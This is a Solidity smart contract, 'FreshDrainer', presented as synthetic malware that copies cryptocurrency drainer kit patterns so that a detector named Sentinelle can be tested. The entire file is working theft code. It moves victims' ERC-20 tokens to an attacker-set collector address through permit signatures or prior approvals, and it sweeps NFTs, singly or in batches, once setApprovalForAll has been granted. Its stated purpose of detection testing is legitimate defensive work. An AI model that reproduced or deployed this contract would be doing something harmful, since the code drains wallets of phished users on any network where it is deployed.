// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

/**
 * @title FreshDrainer
 * @notice Reproduces real drainer kit patterns for Sentinelle demo/testing.
 *         Supports: permit+transferFrom, approve+sweep, setApprovalForAll+sweepNFT.
 *
 *         ⚠️  SYNTHETIC MALWARE FOR EDUCATIONAL/TESTING PURPOSES ONLY
 *         ⚠️  ONLY DEPLOY ON TEST NETWORKS (Fuji, local Hardhat)
 *         ⚠️  Never deploy on mainnet or use against real users
 *
 *         This contract simulates how real drainer kits operate to help
 *         Sentinelle detect and warn users about malicious signatures.
 */
contract FreshDrainer {
    address public immutable collector;

    event DrainedERC20(address indexed victim, address indexed token, uint256 amount);
    event DrainedNFT(address indexed victim, address indexed token, uint256 tokenId);

    constructor(address _collector) {
        require(_collector != address(0), "Collector cannot be zero");
        collector = _collector;
    }

    /**
     * @notice Drains ERC-20 tokens using an off-chain permit signature.
     *         The victim signs a permit, attacker calls this function.
     *         Pattern: permit() + transferFrom() in one transaction.
     * @param token The ERC-20 token with EIP-2612 permit
     * @param victim The address that signed the permit
     * @param amount Amount to drain (typically type(uint256).max)
     * @param deadline Permit deadline
     * @param v Signature v
     * @param r Signature r
     * @param s Signature s
     */
    function drainWithPermit(
        address token,
        address victim,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // Execute the permit (victim signed off-chain)
        IERC20Permit(token).permit(victim, address(this), amount, deadline, v, r, s);

        // Transfer victim's entire balance to collector
        uint256 balance = IERC20(token).balanceOf(victim);
        uint256 toTransfer = amount < balance ? amount : balance;

        IERC20(token).transferFrom(victim, collector, toTransfer);

        emit DrainedERC20(victim, token, toTransfer);
    }

    /**
     * @notice Drains ERC-20 tokens after victim has called approve().
     *         Pattern: victim calls approve() on phishing site, attacker sweeps later.
     * @param token The ERC-20 token
     * @param victim The address that approved this contract
     */
    function sweepERC20(address token, address victim) external {
        uint256 allowance = IERC20(token).allowance(victim, address(this));
        uint256 balance = IERC20(token).balanceOf(victim);
        uint256 toTransfer = allowance < balance ? allowance : balance;

        require(toTransfer > 0, "No allowance or balance");

        IERC20(token).transferFrom(victim, collector, toTransfer);

        emit DrainedERC20(victim, token, toTransfer);
    }

    /**
     * @notice Drains an NFT after victim has called setApprovalForAll().
     *         Pattern: victim approves all NFTs, attacker sweeps specific tokenIds.
     * @param token The ERC-721 token
     * @param victim The address that approved this contract
     * @param tokenId The token ID to drain
     */
    function sweepNFT(address token, address victim, uint256 tokenId) external {
        require(
            IERC721(token).isApprovedForAll(victim, address(this)),
            "Not approved for all"
        );
        require(IERC721(token).ownerOf(tokenId) == victim, "Victim does not own token");

        IERC721(token).transferFrom(victim, collector, tokenId);

        emit DrainedNFT(victim, token, tokenId);
    }

    /**
     * @notice Batch sweep multiple NFTs in one transaction
     * @param token The ERC-721 token
     * @param victim The address that approved this contract
     * @param tokenIds Array of token IDs to drain
     */
    function sweepNFTBatch(address token, address victim, uint256[] calldata tokenIds) external {
        require(
            IERC721(token).isApprovedForAll(victim, address(this)),
            "Not approved for all"
        );

        for (uint256 i = 0; i < tokenIds.length; i++) {
            if (IERC721(token).ownerOf(tokenIds[i]) == victim) {
                IERC721(token).transferFrom(victim, collector, tokenIds[i]);
                emit DrainedNFT(victim, token, tokenIds[i]);
            }
        }
    }
}
